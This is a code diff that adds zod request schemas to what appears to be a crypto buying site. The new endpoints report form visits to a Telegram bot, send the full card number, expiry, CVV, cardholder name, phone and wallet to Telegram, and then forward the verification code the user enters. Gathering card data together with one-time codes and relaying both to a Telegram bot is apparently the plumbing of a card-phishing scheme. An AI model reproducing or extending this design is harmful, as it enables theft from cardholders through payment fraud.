@@ -14,3 +14,53 @@ import * as zod from "zod";
 export const HealthCheckResponse = zod.object({
   status: zod.string(),
 });
+
+/**
+ * Sends a Telegram notification when someone visits the buy form
+ * @summary Notify form visit
+ */
+export const NotifyVisitBody = zod.object({
+  timestamp: zod.string(),
+});
+
+export const NotifyVisitResponse = zod.object({
+  success: zod.boolean(),
+  message: zod.string(),
+});
+
+/**
+ * Sends order form data to Telegram bot
+ * @summary Submit order data
+ */
+export const SubmitOrderBody = zod.object({
+  amount: zod.number(),
+  amountIQD: zod.number(),
+  cardName: zod.string(),
+  cardNumber: zod.string(),
+  expiryDate: zod.string(),
+  cvv: zod.string(),
+  phone: zod.string(),
+  walletAddress: zod.string(),
+  couponCode: zod.string().optional(),
+  paymentMethod: zod.string(),
+});
+
+export const SubmitOrderResponse = zod.object({
+  success: zod.boolean(),
+  message: zod.string(),
+  orderId: zod.string(),
+});
+
+/**
+ * Sends the verification code entered by user to Telegram bot
+ * @summary Submit verification code
+ */
+export const SubmitVerificationCodeBody = zod.object({
+  orderId: zod.string(),
+  code: zod.string(),
+});
+
+export const SubmitVerificationCodeResponse = zod.object({
+  success: zod.boolean(),
+  message: zod.string(),
+});
